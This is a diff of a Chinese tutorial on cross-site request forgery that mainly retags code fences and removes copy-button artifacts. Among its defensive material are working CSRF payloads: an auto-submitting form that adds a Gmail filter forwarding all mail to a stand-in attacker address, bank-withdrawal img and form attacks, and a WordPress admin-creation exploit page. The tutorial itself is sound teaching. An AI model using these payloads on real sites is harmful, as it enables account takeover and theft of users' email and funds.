@@ -32,7 +32,7 @@
 
 小明仔细查了下域名的转让，对方是拥有自己的验证码的，而域名的验证码只存在于自己的邮箱里面。小明回想起那天奇怪的链接，打开后重新查看了“空白页”的源码：
 
-```
+```html
 <form method="POST" action="https://mail.google.com/mail/h/ewt1jmuj4ddv/?v=prf" enctype="multipart/form-data"> 
     <input type="hidden" name="cf2_emc" value="true"/> 
     <input type="hidden" name="cf2_email" value="hacker@hakermail.com"/> 
@@ -43,7 +43,6 @@
 <script> 
     document.forms[0].submit();
 </script>
-复制代码
 ```
 
 > 这个页面只要打开，就会向Gmail发送一个post请求。请求中，执行了“Create Filter”命令，将所有的邮件，转发到“hacker@hakermail.com”。
@@ -79,9 +78,9 @@ CSRF（Cross-site request forgery）跨站请求伪造：攻击者诱导受害�
 
 GET类型的CSRF利用非常简单，只需要一个HTTP请求，一般会这样利用：
 
-```
+```html
  <img src="http://bank.example/withdraw?amount=10000&for=hacker" > 
-复制代码
+
 ```
 
 在受害者访问含有这个img的页面后，浏览器会自动向`http://bank.example/withdraw?account=xiaoming&amount=10000&for=hacker`发出一次HTTP请求。bank.example就会收到包含受害者登录信息的一次跨域请求。
@@ -90,14 +89,13 @@ GET类型的CSRF利用非常简单，只需要一个HTTP请求，一般会这样
 
 这种类型的CSRF利用起来通常使用的是一个自动提交的表单，如：
 
-```
+```html
  <form action="http://bank.example/withdraw" method=POST>
     <input type="hidden" name="account" value="xiaoming" />
     <input type="hidden" name="amount" value="10000" />
     <input type="hidden" name="for" value="hacker" />
 </form>
 <script> document.forms[0].submit(); </script> 
-复制代码
 ```
 
 访问该页面后，表单会自动提交，相当于模拟用户完成了一次POST操作。
@@ -108,11 +106,10 @@ POST类型的攻击通常比GET要求更加严格一点，但仍并不复杂。�
 
 链接类型的CSRF并不常见，比起其他两种用户打开页面就中招的情况，这种需要用户点击链接才会触发。这种类型通常是在论坛中发布的图片中嵌入恶意链接，或者以广告的形式诱导用户中招，攻击者通常会以比较夸张的词语诱骗用户点击，例如：
 
-```
+```html
   <a href="http://test.com/csrf/withdraw.php?amount=1000&for=hacker" taget="_blank">
   重磅消息！！
   <a/>
-复制代码
 ```
 
 由于之前用户登录了信任的网站A，并且保存登录状态，只要用户主动访问上面的这个PHP页面，则表示攻击成功。
@@ -196,9 +193,9 @@ CSRF通常从第三方网站发起，被攻击的网站无法防止攻击发生�
 
 上面说的这些比较多，但我们可以知道一个问题：攻击者可以在自己的请求中隐藏Referer。如果攻击者将自己的请求这样填写：
 
-```
+```html
  <img src="http://bank.example/withdraw?amount=10000&for=hacker" referrerpolicy="no-referrer"> 
-复制代码
+
 ```
 
 那么这个请求发起的攻击将不携带Referer。
@@ -228,7 +225,7 @@ CSRF通常从第三方网站发起，被攻击的网站无法防止攻击发生�
 ```
 Accept: text/html
 Method: GET
-复制代码
+
 ```
 
 但相应的，页面请求就暴露在了CSRF的攻击范围之中。如果你的网站中，在页面的GET请求中对当前用户做了什么操作的话，防范就失效了。
@@ -237,7 +234,7 @@ Method: GET
 
 ```
 GET https://example.com/addComment?comment=XXX&dest=orderId
-复制代码
+
 ```
 
 注：这种严格来说并不一定存在CSRF攻击的风险，但仍然有很多网站经常把主文档GET请求挂上参数来实现产品功能，但是这样做对于自身来说是存在安全风险的。
@@ -264,9 +261,9 @@ CSRF Token的防护策略分为三个步骤：
 
 对于GET请求，Token将附在请求地址之后，这样URL 就变成 http://url?csrftoken=tokenvalue。 而对于 POST 请求来说，要在 form 的最后加上：
 
-```
+```html
  <input type=”hidden” name=”csrftoken” value=”tokenvalue”/>
-复制代码
+
 ```
 
 这样，就把Token以参数的形式加入请求了。
@@ -277,7 +274,7 @@ CSRF Token的防护策略分为三个步骤：
 
 这种方法要比之前检查Referer或者Origin要安全一些，Token可以在产生并放于Session之中，然后在每次请求时把Token从Session中拿出，与请求中的Token进行比对，但这种方法的比较麻烦的在于如何把Token以参数的形式加入请求。 下面将以Java为例，介绍一些CSRF Token的服务端校验逻辑，代码如下：
 
-```
+```js
 HttpServletRequest req = (HttpServletRequest)request; 
 HttpSession s = req.getSession(); 
  
@@ -301,7 +298,6 @@ if(sToken == null){
        request.getRequestDispatcher(“error.jsp”).forward(request,response); 
    } 
 }
-复制代码
 ```
 
 代码源自[IBM developerworks CSRF](https://www.ibm.com/developerworks/cn/web/1102_niugang_csrf/)
@@ -375,11 +371,10 @@ Token是一个比较有效的CSRF防护方法，只要页面没有XSS漏洞泄�
 
 这种称为严格模式，表明这个 Cookie 在任何情况下都不可能作为第三方 Cookie，绝无例外。比如说 [b.com](http://b.com) 设置了如下 Cookie：
 
-```
+```json
 Set-Cookie: foo=1; Samesite=Strict
 Set-Cookie: bar=2; Samesite=Lax
 Set-Cookie: baz=3
-复制代码
 ```
 
 我们在 [a.com](http://a.com) 下发起对 [b.com](http://b.com) 的任意请求，foo 这个 Cookie 都不会被包含在 Cookie 请求头中，但 bar 会。举个实际的例子就是，假如淘宝网站用来识别用户登录与否的 Cookie 被设置成了 Samesite=Strict，那么用户从百度搜索页面甚至天猫页面的链接点击进入淘宝后，淘宝都不会是登录状态，因为淘宝的服务器不会接受到那个 Cookie，其它网站发起的对淘宝的任意请求都不会带上那个 Cookie。
@@ -388,18 +383,18 @@ Set-Cookie: baz=3
 
 这种称为宽松模式，比 Strict 放宽了点限制：假如这个请求是这种请求（改变了当前页面或者打开了新页面）且同时是个GET请求，则这个Cookie可以作为第三方Cookie。比如说 b.com设置了如下Cookie：
 
-```
+```json
 Set-Cookie: foo=1; Samesite=Strict
 Set-Cookie: bar=2; Samesite=Lax
 Set-Cookie: baz=3
-复制代码
+
 ```
 
 当用户从 [a.com](http://a.com) 点击链接进入 [b.com](http://b.com) 时，foo 这个 Cookie 不会被包含在 Cookie 请求头中，但 bar 和 baz 会，也就是说用户在不同网站之间通过链接跳转是不受影响了。但假如这个请求是从 [a.com](http://a.com) 发起的对 [b.com](http://b.com) 的异步请求，或者页面跳转是通过表单的 post 提交触发的，则bar也不会发送。
 
 生成Token放到Cookie中并且设置Cookie的Samesite，Java代码如下：
 
-```
+```js
  private void addTokenCookieAndHeader(HttpServletRequest httpRequest, HttpServletResponse httpResponse) {
         //生成token
         String sToken = this.generateToken();
@@ -409,7 +404,7 @@ Set-Cookie: baz=3
         httpResponse.addHeader("Set-Cookie", CookieSpec);
         httpResponse.setHeader(CSRF_TOKEN_NAME, token);
     }
-复制代码
+
 ```
 
 代码源自[OWASP Cross-Site_Request_Forgery #Implementation example](https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet#Implementation_example)
@@ -518,7 +513,7 @@ CSRF攻击有着比较明显的特征：
 
 那么这个漏洞实际上就是攻击者引导用户先进入目标的WordPress，然后点击其钓鱼站点上的某个按钮，该按钮实际上是表单提交按钮，其会触发表单的提交工作，添加某个具有管理员权限的用户，实现的码如下：
 
-```
+```html
 <html> 
 <body onload="javascript:document.forms[0].submit()"> 
 <H2>CSRF Exploit to add Administrator</H2> 
@@ -538,17 +533,17 @@ CSRF攻击有着比较明显的特征：
 </form> 
 </body> 
 </html> 
-复制代码
+
 ```
 
 #### YouTube的CSRF漏洞
 
 2008年，有安全研究人员发现，YouTube上几乎所有用户可以操作的动作都存在CSRF漏洞。如果攻击者已经将视频添加到用户的“Favorites”，那么他就能将他自己添加到用户的“Friend”或者“Family”列表，以用户的身份发送任意的消息，将视频标记为不宜的，自动通过用户的联系人来共享一个视频。例如，要把视频添加到用户的“Favorites”，攻击者只需在任何站点上嵌入如下所示的IMG标签：
 
-```
+```html
 <img src="http://youtube.com/watch_ajax?action_add_favorite_playlist=1&video_
 id=[VIDEO ID]&playlist_id=&add_to_favorite=1&show=1&button=AddvideoasFavorite"/>
-复制代码
+
 ```
 
 攻击者也许已经利用了该漏洞来提高视频的流行度。例如，将一个视频添加到足够多用户的“Favorites”，YouTube就会把该视频作为“Top Favorites”来显示。除提高一个视频的流行度之外，攻击者还可以导致用户在毫不知情的情况下将一个视频标记为“不宜的”，从而导致YouTube删除该视频。
